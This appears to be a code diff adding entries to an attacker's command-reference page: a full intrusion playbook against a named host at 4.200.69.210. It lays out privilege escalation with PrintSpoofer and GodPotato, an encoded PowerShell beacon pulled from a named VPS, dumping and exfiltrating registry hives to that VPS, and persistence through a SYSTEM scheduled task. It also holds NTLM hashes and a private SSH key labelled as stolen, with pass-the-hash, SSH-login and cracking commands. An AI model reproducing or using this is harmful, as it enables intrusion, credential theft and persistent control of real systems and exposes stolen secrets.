@@ -2729,6 +2729,237 @@ const COMMANDS = [
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
+  // ═══════════════════════════════════════════════════════════════
+  // FULL KILL CHAIN - VPS 168.144.166.97
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[CHAIN-1] Check SeImpersonate Privilege",
+    code: "whoami /priv | findstr SeImpersonate",
+    tags: ["cmd", "privesc", "recon", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[CHAIN-2] Download PrintSpoofer",
+    code: "IWR -Uri 'http://168.144.166.97:8889/PrintSpoofer.exe' -OutFile C:\\\\Windows\\\\Temp\\\\ps.exe -UseBasicParsing",
+    tags: ["ps", "privesc", "c2", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[CHAIN-3] Download GodPotato",
+    code: "IWR -Uri 'http://168.144.166.97:8889/GodPotato.exe' -OutFile C:\\\\Windows\\\\Temp\\\\gp.exe -UseBasicParsing",
+    tags: ["ps", "privesc", "c2", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[CHAIN-4] Encode Beacon for -enc",
+    code: "$cmd = 'IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))",
+    tags: ["ps", "privesc", "c2", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[CHAIN-5] PrintSpoofer to SYSTEM",
+    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
+    tags: ["cmd", "privesc", "c2", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[CHAIN-5-ALT] GodPotato to SYSTEM",
+    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
+    tags: ["cmd", "privesc", "c2", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[CHAIN-6] Dump SAM/SYSTEM/SECURITY",
+    code: "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam\\nreg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys\\nreg save HKLM\\\\SECURITY C:\\\\Windows\\\\Temp\\\\sec",
+    tags: ["cmd", "postexploit", "playbook"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[CHAIN-7] Exfil SAM to VPS",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sam'); IRM -Uri 'http://168.144.166.97:8083/sam' -Method POST -Body $s",
+    tags: ["ps", "postexploit", "c2", "playbook"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[CHAIN-8] Exfil SYSTEM to VPS",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sys'); IRM -Uri 'http://168.144.166.97:8083/system' -Method POST -Body $s",
+    tags: ["ps", "postexploit", "c2", "playbook"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[CHAIN-9] SYSTEM Persistence (Survives Reboot)",
+    code: "schtasks /create /tn \"Updater\" /tr \"powershell -w hidden -ep bypass IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)\" /sc onstart /ru SYSTEM /f",
+    tags: ["cmd", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // VPS SETUP - 168.144.166.97
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "VPS: Start C2 Listener (4444)",
+    code: "cd /root && python3 c2_multi_v2.py",
+    tags: ["linux", "vps", "c2", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Start HTTP Server (8889)",
+    code: "cd /opt && python3 -m http.server 8889",
+    tags: ["linux", "vps", "c2", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Start Exfil Receiver (8083)",
+    code: "cd /opt && python3 catch_all.py",
+    tags: ["linux", "vps", "c2", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Copy Beacon to HTTP Dir",
+    code: "cp /beacon_persistent.ps1 /opt/beacon.ps1",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Download Potato Tools",
+    code: "cd /opt\\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe\\nwget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe",
+    tags: ["linux", "vps", "privesc"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Check All Listeners",
+    code: "ss -tlnp | grep -E '4444|8080|8083|8889'",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // CLOUDLABS HASHES - DUMPED 2026-08-02
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[HASH] adminvm1 (RID 500 - Local Admin)",
+    code: "a4840a9c4a6828c0d5b5dbfa3bc567b0",
+    tags: ["hash", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[HASH] trainer (RID 1000)",
+    code: "996d8424607cc98092971283e3ac5b1c",
+    tags: ["hash", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[HASH] alsadmin (RID 1001)",
+    code: "ff81519803d67ea2c41a2c40b70010e0",
+    tags: ["hash", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[HASH] psycho (RID 1002)",
+    code: "ab4f5a5c42df5a0ee337d12ce77332f5",
+    tags: ["hash", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // PASS THE HASH - Use hashes without cracking
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[PTH] WMIExec as adminvm1",
+    code: "impacket-wmiexec -hashes :a4840a9c4a6828c0d5b5dbfa3bc567b0 adminvm1@4.200.69.210",
+    tags: ["linux", "vps", "lateral", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[PTH] WMIExec as trainer",
+    code: "impacket-wmiexec -hashes :996d8424607cc98092971283e3ac5b1c trainer@4.200.69.210",
+    tags: ["linux", "vps", "lateral"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[PTH] WMIExec as alsadmin",
+    code: "impacket-wmiexec -hashes :ff81519803d67ea2c41a2c40b70010e0 alsadmin@4.200.69.210",
+    tags: ["linux", "vps", "lateral"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[PTH] WMIExec as psycho",
+    code: "impacket-wmiexec -hashes :ab4f5a5c42df5a0ee337d12ce77332f5 psycho@4.200.69.210",
+    tags: ["linux", "vps", "lateral"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[PTH] SMBExec (stealthier)",
+    code: "impacket-smbexec -hashes :a4840a9c4a6828c0d5b5dbfa3bc567b0 adminvm1@4.200.69.210",
+    tags: ["linux", "vps", "lateral"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[PTH] PSExec (gives SYSTEM)",
+    code: "python3 -m impacket.examples.psexec -hashes :a4840a9c4a6828c0d5b5dbfa3bc567b0 adminvm1@4.200.69.210",
+    tags: ["linux", "vps", "lateral", "privesc"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // SSH KEY - STOLEN FROM CLOUDLABS
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[SSH] Stolen adminvm1 Private Key",
+    code: "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\\n-----END OPENSSH PRIVATE KEY-----",
+    tags: ["ssh", "persist", "lateral"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH] Save Key and Connect",
+    code: "echo '-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\\n-----END OPENSSH PRIVATE KEY-----' > ~/.ssh/cloudlabs_key && chmod 600 ~/.ssh/cloudlabs_key && ssh -i ~/.ssh/cloudlabs_key adminvm1@4.200.69.210",
+    tags: ["linux", "vps", "lateral", "playbook"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // HASH CRACKING
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "VPS: Install Hashcat + Wordlist",
+    code: "apt install hashcat -y && curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o /usr/share/wordlists/rockyou.txt",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Crack All CloudLabs Hashes",
+    code: "echo 'a4840a9c4a6828c0d5b5dbfa3bc567b0\\n996d8424607cc98092971283e3ac5b1c\\nff81519803d67ea2c41a2c40b70010e0\\nab4f5a5c42df5a0ee337d12ce77332f5' > /tmp/hashes.txt && hashcat -m 1000 -a 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force",
+    tags: ["linux", "vps", "postexploit", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Crack trainer Hash",
+    code: "echo '996d8424607cc98092971283e3ac5b1c' > /tmp/trainer.txt && hashcat -m 1000 -a 0 /tmp/trainer.txt /usr/share/wordlists/rockyou.txt --force",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Show Cracked Hashes",
+    code: "hashcat -m 1000 /tmp/hashes.txt --show",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Dump Hashes from SAM+SYSTEM",
+    code: "impacket-secretsdump -sam /keys/*sam* -system /keys/*system* LOCAL",
+    tags: ["linux", "vps", "postexploit", "playbook"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // PORTS REFERENCE
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[PORTS] VPS Service Map",
+    code: "# 4444 - C2 Handler (c2_multi_v2.py)\\n# 8080 - HTTP Server (general)\\n# 8083 - Exfil Receiver (catch_all.py)\\n# 8889 - HTTP Server (beacon/tools)\\n# 9999 - Spare",
+    tags: ["reference", "vps"],
+    accent: "#607d8b"
+  },
+  {
+    title: "[PORTS] Target CloudLabs 4.200.69.210",
+    code: "# 22 - SSH (OpenSSH)\\n# 445 - SMB (for PTH)\\n# 3389 - RDP\\n# 135 - WMI (for wmiexec)",
+    tags: ["reference", "recon"],
+    accent: "#607d8b"
+  },
 ];
 
 const list = document.getElementById('cmdList');
